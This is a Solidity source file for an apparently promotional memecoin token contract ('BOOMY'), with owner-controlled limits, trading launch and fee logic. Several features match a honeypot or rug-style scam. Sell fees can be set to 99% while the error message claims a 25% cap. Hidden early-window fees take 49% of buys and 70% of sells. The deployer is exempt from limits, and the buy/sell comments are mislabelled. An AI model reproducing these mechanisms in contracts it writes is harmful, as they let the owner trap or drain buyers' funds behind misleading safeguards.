// BOOMY = SONIC ???
// https://t.me/bommyeth

// SPDX-License-Identifier: MIT

pragma solidity =0.8.18;
import "./TestLib.sol";
contract removeLimitsFacet is ERC20, Ownable {
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event BoughtEarly(address indexed sniper);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    function removeLimits() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
        return true;
    }
    function updateSwapTokensAtAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 100,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        ds.swapTokensAtAmount = newAmount;
        return true;
    }
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 1) / 100) / 1e18,
            "Cannot set ds.maxTransactionAmount lower than 1%"
        );
        ds.maxTransactionAmount = newNum * (10 ** 18);
    }
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 2) / 100) / 1e18,
            "Cannot set ds.maxWallet lower than 2%"
        );
        ds.maxWallet = newNum * (10 ** 18);
    }
    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedMaxTransactionAmount[updAds] = isEx;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = enabled;
    }
    function initialize() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingActive);
        ds.launchBlock = 1;
    }
    function openTrading(uint256 b) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingActive && ds.launchBlock != 0);
        ds.launchBlock += block.number + b;
        ds.tradingActive = true;
    }
    function updateBuyFees(
        uint256 _liquidityFee,
        uint256 _devFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyLiquidityFee = _liquidityFee;
        ds.buyDevFee = _devFee;
        ds.buyTotalFees = ds.buyLiquidityFee + ds.buyDevFee;
        require(ds.buyTotalFees <= 20, "Must keep fees at 20% or less");
    }
    function updateSellFees(
        uint256 _liquidityFee,
        uint256 _devFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellLiquidityFee = _liquidityFee;
        ds.sellDevFee = _devFee;
        ds.sellTotalFees = ds.sellLiquidityFee + ds.sellDevFee;
        require(ds.sellTotalFees <= 99, "Must keep fees at 25% or less");
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            pair != ds.uniswapV2Pair,
            "The pair cannot be removed from ds.automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != ds.deployer &&
                to != ds.deployer &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds._isExcludedFromFees[from] ||
                            ds._isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                //when buy
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Buy transfer amount exceeds the ds.maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Sell transfer amount exceeds the ds.maxTransactionAmount."
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = swappable(contractTokenBalance);

        if (
            canSwap &&
            ds.swapEnabled &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            ds.swapping = true;

            swapBack();

            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            if (0 < ds.launchBlock && ds.launchBlock < block.number) {
                // on buy
                if (ds.automatedMarketMakerPairs[to] && ds.sellTotalFees > 0) {
                    fees = (amount * ds.sellTotalFees) / 100;
                    ds.tokensForLiquidity +=
                        (fees * ds.sellLiquidityFee) /
                        ds.sellTotalFees;
                    ds.tokensForDev +=
                        (fees * ds.sellDevFee) /
                        ds.sellTotalFees;
                }
                // on sell
                else if (
                    ds.automatedMarketMakerPairs[from] && ds.buyTotalFees > 0
                ) {
                    fees = (amount * ds.buyTotalFees) / 100;
                    ds.tokensForLiquidity +=
                        (fees * ds.buyLiquidityFee) /
                        ds.buyTotalFees;
                    ds.tokensForDev += (fees * ds.buyDevFee) / ds.buyTotalFees;
                }
            } else {
                fees = getFees(from, to, amount);
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    function swappable(
        uint256 contractTokenBalance
    ) private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            contractTokenBalance >= ds.swapTokensAtAmount &&
            block.number > ds.launchBlock &&
            ds._blockLastTrade[block.number] < 3;
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = ds.tokensForLiquidity + ds.tokensForDev;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > ds.swapTokensAtAmount * 22) {
            contractBalance = ds.swapTokensAtAmount * 22;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * ds.tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance - liquidityTokens;

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;

        uint256 ethForDev = (ethBalance * ds.tokensForDev) / totalTokensToSwap;

        uint256 ethForLiquidity = ethBalance - ethForDev;

        ds.tokensForLiquidity = 0;
        ds.tokensForDev = 0;

        (success, ) = address(ds.devWallet).call{value: ethForDev}("");

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                ds.tokensForLiquidity
            );
        }
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // make the swap
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        ds._blockLastTrade[block.number]++;
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // add the liquidity
        ds.uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadAddress,
            block.timestamp
        );
    }
    function getFees(
        address from,
        address to,
        uint256 amount
    ) private returns (uint256 fees) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.automatedMarketMakerPairs[from]) {
            fees = (amount * 49) / 100;
            ds.tokensForLiquidity +=
                (fees * ds.buyLiquidityFee) /
                ds.buyTotalFees;
            ds.tokensForDev += (fees * ds.buyDevFee) / ds.buyTotalFees;
            emit BoughtEarly(to); //sniper
        } else {
            fees = (amount * (ds.launchBlock == 0 ? 30 : 70)) / 100;
            ds.tokensForLiquidity +=
                (fees * ds.sellLiquidityFee) /
                ds.sellTotalFees;
            ds.tokensForDev += (fees * ds.sellDevFee) / ds.sellTotalFees;
        }
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
}
